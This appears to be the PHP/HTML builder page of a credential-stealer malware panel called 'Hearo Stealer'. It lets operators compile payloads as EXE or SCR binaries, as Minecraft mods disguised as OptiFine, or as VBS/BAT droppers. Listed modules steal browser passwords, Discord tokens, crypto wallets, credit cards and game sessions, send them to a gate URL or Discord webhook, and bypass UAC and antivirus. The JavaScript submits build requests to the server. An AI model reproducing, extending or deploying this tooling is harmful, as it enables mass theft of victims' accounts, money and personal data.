<?php
require_once 'xeff/includes/config.php';
require_once 'xeff/includes/auth.php';
requireAuth();

$builds = $db->query("SELECT * FROM build_configs WHERE user_id = " . (int)$_SESSION['user_id'] . " ORDER BY created_at DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
$gateUrl = getGateUrl();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Builder â€” Hearo Stealer</title>
    <link rel="icon" href="xeff/assets/logo.png" type="image/png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="xeff/css/elite.css">
    <link rel="stylesheet" href="xeff/assets/theme.css">
</head>
<body>
    <div class="ambient-glow"></div>
    <div class="noise"></div>

    <?php include 'xeff/includes/navbar.php'; ?>

    <div class="container">

        <!-- 3-Column Builder Cards -->
        <div class="build-grid">

            <!-- EXE Payload -->
            <div class="build-card" id="card-exe">
                <div class="card-tag">Native PE Binary</div>
                <h2 class="card-title">EXE <em>Payload</em></h2>
                <p class="card-subtitle">Single-file standalone payload binary with overlay</p>
                <ul class="feature-list">
                    <li><span>Antivirus Dynamic Bypass Engine</span><span class="feature-check">âœ“</span></li>
                    <li><span>Fodhelper Silent UAC Bypass</span><span class="feature-check">âœ“</span></li>
                    <li><span>Auto Windows Defender Exclusion</span><span class="feature-check">âœ“</span></li>
                    <li><span>Early Anti-VM & Anti-Analysis Checks</span><span class="feature-check">âœ“</span></li>
                    <li><span>All Browser, Discord, Crypto & Steam Stealer</span><span class="feature-check">âœ“</span></li>
                </ul>
                <div class="format-toggles">
                    <button class="format-btn active" onclick="setExeFormat('exe', this)">.EXE BINARY</button>
                    <button class="format-btn" onclick="setExeFormat('scr', this)">.SCR SCREENSAVER</button>
                </div>
                <div class="input-group">
                    <label>File Output Name</label>
                    <input type="text" class="input-field" id="exe-filename" value="Setup.exe">
                </div>
                <button class="compile-btn" onclick="compileBuild('exe')">
                    <div class="spinner"></div>
                    <span class="btn-text">COMPILE EXECUTABLE (.EXE)</span>
                </button>
            </div>

            <!-- JAR Minecraft Mod -->
            <div class="build-card" id="card-jar">
                <div class="card-tag">Java Mod Package</div>
                <h2 class="card-title">JAR <em>Minecraft Mod</em></h2>
                <p class="card-subtitle">All versions of Fabric (1.13 - 1.20+) supported</p>
                <ul class="feature-list">
                    <li><span>1.13-20.2+ Fabric compatibility</span><span class="feature-check">âœ“</span></li>
                    <li><span>Fully Undetectable</span><span class="feature-check">âœ“</span></li>
                    <li><span>All the features in EXE Payload</span><span class="feature-check">âœ“</span></li>
                    <li><span>Create a new or bind with a real mod</span><span class="feature-check">âœ“</span></li>
                </ul>
                <div class="format-toggles">
                    <button class="format-btn active" id="jar-mode-create">CREATE MOD</button>
                    <button class="format-btn" id="jar-mode-bind">BIND MOD</button>
                </div>
                <div class="input-group">
                    <label>Mod Name</label>
                    <input type="text" class="input-field" id="jar-modname" value="OptiFine-HD">
                </div>
                <div class="input-group">
                    <label>Mod Version</label>
                    <input type="text" class="input-field" id="jar-modversion" value="1.20.4">
                </div>
                <button class="compile-btn" onclick="compileBuild('jar')">
                    <div class="spinner"></div>
                    <span class="btn-text">COMPILE MINECRAFT MOD</span>
                </button>
            </div>

            <!-- VBS Dropper -->
            <div class="build-card" id="card-vbs">
                <div class="card-tag">Stealth Script Dropper</div>
                <h2 class="card-title">VBS <em>Dropper</em></h2>
                <p class="card-subtitle">100% Windowless background script payload</p>
                <ul class="feature-list">
                    <li><span>Zero-Console Silent Background Execution</span><span class="feature-check">âœ“</span></li>
                    <li><span>Fully Undetectable</span><span class="feature-check">âœ“</span></li>
                    <li><span>Automatic System Payload Delivery</span><span class="feature-check">âœ“</span></li>
                    <li><span>Dynamic Builder Tag Authentication</span><span class="feature-check">âœ“</span></li>
                    <li><span>Instant 0ms Multi-Arch Packaging</span><span class="feature-check">âœ“</span></li>
                </ul>
                <div class="format-toggles">
                    <button class="format-btn active" onclick="setVbsFormat('vbs', this)">.VBS SCRIPT</button>
                    <button class="format-btn" onclick="setVbsFormat('bat', this)">.BAT BATCH</button>
                </div>
                <div class="input-group">
                    <label>Script File Name</label>
                    <input type="text" class="input-field" id="vbs-filename" value="Installer.vbs">
                </div>
                <button class="compile-btn" onclick="compileBuild('vbs')">
                    <div class="spinner"></div>
                    <span class="btn-text">GENERATE SCRIPT (.VBS)</span>
                </button>
            </div>
        </div>

        <!-- Feature Toggles -->
        <div class="features-panel">
            <div class="features-title"><i class="fa-solid fa-sliders"></i> Stealer Modules</div>
            <div class="features-grid">
                <div class="feature-toggle"><span>Steam Session Stealer</span><label class="toggle-switch"><input type="checkbox" name="feat" value="steam" checked><span class="toggle-slider"></span></label></div>
                <div class="feature-toggle"><span>Roblox Cookie Grabber</span><label class="toggle-switch"><input type="checkbox" name="feat" value="roblox" checked><span class="toggle-slider"></span></label></div>
                <div class="feature-toggle"><span>Discord Token Extraction</span><label class="toggle-switch"><input type="checkbox" name="feat" value="discord_tokens" checked><span class="toggle-slider"></span></label></div>
                <div class="feature-toggle"><span>Discord Injection</span><label class="toggle-switch"><input type="checkbox" name="feat" value="discord_inject" checked><span class="toggle-slider"></span></label></div>
                <div class="feature-toggle"><span>Telegram Session Exporter</span><label class="toggle-switch"><input type="checkbox" name="feat" value="telegram" checked><span class="toggle-slider"></span></label></div>
                <div class="feature-toggle"><span>Crypto Wallet Exporter</span><label class="toggle-switch"><input type="checkbox" name="feat" value="crypto" checked><span class="toggle-slider"></span></label></div>
                <div class="feature-toggle"><span>Browser Passwords & Cookies</span><label class="toggle-switch"><input type="checkbox" name="feat" value="browsers" checked><span class="toggle-slider"></span></label></div>
                <div class="feature-toggle"><span>Credit Card Extraction</span><label class="toggle-switch"><input type="checkbox" name="feat" value="cards" checked><span class="toggle-slider"></span></label></div>
                <div class="feature-toggle"><span>Clipboard Capture</span><label class="toggle-switch"><input type="checkbox" name="feat" value="clipboard" checked><span class="toggle-slider"></span></label></div>
                <div class="feature-toggle"><span>Interesting Files</span><label class="toggle-switch"><input type="checkbox" name="feat" value="files" checked><span class="toggle-slider"></span></label></div>
                <div class="feature-toggle"><span>Anti-Antivirus</span><label class="toggle-switch"><input type="checkbox" name="feat" value="anti_av" checked><span class="toggle-slider"></span></label></div>
                <div class="feature-toggle"><span>Anti-VM / Anti-Analysis</span><label class="toggle-switch"><input type="checkbox" name="feat" value="anti_vm" checked><span class="toggle-slider"></span></label></div>
                <div class="feature-toggle"><span>UAC Bypass (Fodhelper)</span><label class="toggle-switch"><input type="checkbox" name="feat" value="uac_bypass" checked><span class="toggle-slider"></span></label></div>
                <div class="feature-toggle"><span>FileZilla / Mullvad VPN</span><label class="toggle-switch"><input type="checkbox" name="feat" value="misc" checked><span class="toggle-slider"></span></label></div>
            </div>
            <div class="webhook-section">
                <div class="input-group" style="margin-bottom:0;">
                    <label>Discord Webhook URL (optional)</label>
                    <input type="text" class="input-field" id="webhook-url" placeholder="https://discord.com/api/webhooks/...">
                </div>
            </div>
        </div>

        <!-- Build History -->
        <div class="history-header">
            <div class="history-title">Compiled Builds History</div>
            <div class="history-count"><?= count($builds) ?> artifacts recorded</div>
        </div>
        <div class="history-table">
            <table>
                <thead>
                    <tr>
                        <th>Filename & Target</th>
                        <th>Artifact Type</th>
                        <th>File Size</th>
                        <th>SHA-256 Checksum</th>
                        <th>Compiled Timestamp</th>
                        <th style="text-align:right;">Action</th>
                    </tr>
                </thead>
                <tbody id="buildHistory">
                    <?php if (empty($builds)): ?>
                    <tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.25); padding: 30px;">No builds compiled yet.</td></tr>
                    <?php else: ?>
                        <?php foreach($builds as $b): ?>
                        <tr>
                            <td style="display:flex; align-items:center; gap:10px;">
                                <div style="width:28px;height:28px;background:rgba(255,255,255,0.05);border-radius:4px;display:flex;align-items:center;justify-content:center;">
                                    <span style="font-family:var(--mono);font-size:8px;color:var(--text-muted);text-transform:uppercase;"><?= strtoupper($b['format']) ?></span>
                                </div>
                                <span style="font-size:12px; color:rgba(255,255,255,0.7);"><?= sanitize($b['output_filename']) ?></span>
                            </td>
                            <td><span class="badge-format"><?= strtoupper($b['format']) ?></span></td>
                            <td style="font-family:var(--mono); font-size:11px; color:var(--text-muted);"><?= formatBytes($b['compiled_size']) ?></td>
                            <td style="font-family:var(--mono); font-size:10px; color:rgba(255,255,255,0.25);"><?= substr($b['sha256_hash'], 0, 16) ?>...</td>
                            <td style="font-family:var(--mono); font-size:11px; color:var(--text-muted);"><?= date('M d, H:i', strtotime($b['created_at'])) ?></td>
                            <td style="text-align:right;">
                                <a href="download_build.php?id=<?= $b['id'] ?>" class="btn-download"><i class="fa-solid fa-download" style="font-size:10px;"></i> Download</a>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>
    </div>

    <!-- Build Result Toast -->
    <div class="build-result" id="buildResult">
        <div class="result-title" id="resultTitle">Build Successful</div>
        <div class="result-info" id="resultInfo"></div>
    </div>

    <script>
        let currentExeFormat = 'exe';
        let currentVbsFormat = 'vbs';
        const gateUrl = <?= json_encode($gateUrl) ?>;

        function setExeFormat(fmt, btn) {
            currentExeFormat = fmt;
            btn.parentElement.querySelectorAll('.format-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            const compBtn = document.querySelector('#card-exe .compile-btn .btn-text');
            compBtn.textContent = fmt === 'scr' ? 'COMPILE SCREENSAVER (.SCR)' : 'COMPILE EXECUTABLE (.EXE)';
        }

        function setVbsFormat(fmt, btn) {
            currentVbsFormat = fmt;
            btn.parentElement.querySelectorAll('.format-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            const compBtn = document.querySelector('#card-vbs .compile-btn .btn-text');
            compBtn.textContent = fmt === 'bat' ? 'GENERATE BATCH (.BAT)' : 'GENERATE SCRIPT (.VBS)';
        }

        function getFeatures() {
            const feats = {};
            document.querySelectorAll('input[name="feat"]').forEach(cb => {
                feats[cb.value] = cb.checked;
            });
            return JSON.stringify(feats);
        }

        function compileBuild(cardType) {
            let format, outputFilename, buildName, jarModName, jarModVersion;
            let compileBtn;

            if (cardType === 'exe') {
                format = currentExeFormat;
                outputFilename = document.getElementById('exe-filename').value;
                buildName = 'EXE_' + Date.now();
                compileBtn = document.querySelector('#card-exe .compile-btn');
            } else if (cardType === 'jar') {
                format = 'jar';
                jarModName = document.getElementById('jar-modname').value;
                jarModVersion = document.getElementById('jar-modversion').value;
                outputFilename = jarModName + '.jar';
                buildName = 'JAR_' + Date.now();
                compileBtn = document.querySelector('#card-jar .compile-btn');
            } else {
                format = currentVbsFormat;
                outputFilename = document.getElementById('vbs-filename').value;
                buildName = format.toUpperCase() + '_' + Date.now();
                compileBtn = document.querySelector('#card-vbs .compile-btn');
            }

            compileBtn.classList.add('loading');

            const body = new URLSearchParams({
                format: format,
                build_name: buildName,
                gate_url: gateUrl,
                webhook_url: document.getElementById('webhook-url').value,
                features: getFeatures(),
                output_filename: outputFilename,
                jar_mod_name: jarModName || '',
                jar_mod_version: jarModVersion || '',
            });

            fetch('build_api.php', { method: 'POST', body: body })
                .then(r => r.json())
                .then(data => {
                    compileBtn.classList.remove('loading');
                    const toast = document.getElementById('buildResult');
                    const title = document.getElementById('resultTitle');
                    const info = document.getElementById('resultInfo');

                    if (data.status === 'success') {
                        toast.className = 'build-result show';
                        title.innerHTML = '<i class="fa-solid fa-circle-check" style="color:#10b981;"></i> Build Successful';
                        let infoHtml = `Format: ${data.format.toUpperCase()}<br>Size: ${data.size}<br>SHA256: ${data.sha256.substring(0, 24)}...<br><a href="${data.download}" class="result-link" download><i class="fa-solid fa-download"></i> Download Build</a>`;
                        if (data.gofile_url) {
                            infoHtml += `<br><a href="${data.gofile_url}" class="result-link" target="_blank" rel="noopener"><i class="fa-solid fa-cloud-arrow-down"></i> GoFile Download</a>`;
                        }
                        info.innerHTML = infoHtml;
                    } else {
                        toast.className = 'build-result error show';
                        title.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="color:#ef4444;"></i> Build Failed';
                        info.textContent = data.error || 'Unknown error';
                    }
                    setTimeout(() => { toast.classList.remove('show'); }, 8000);
                })
                .catch(err => {
                    compileBtn.classList.remove('loading');
                    alert('Network error: ' + err.message);
                });
        }
    </script>
</body>
</html>
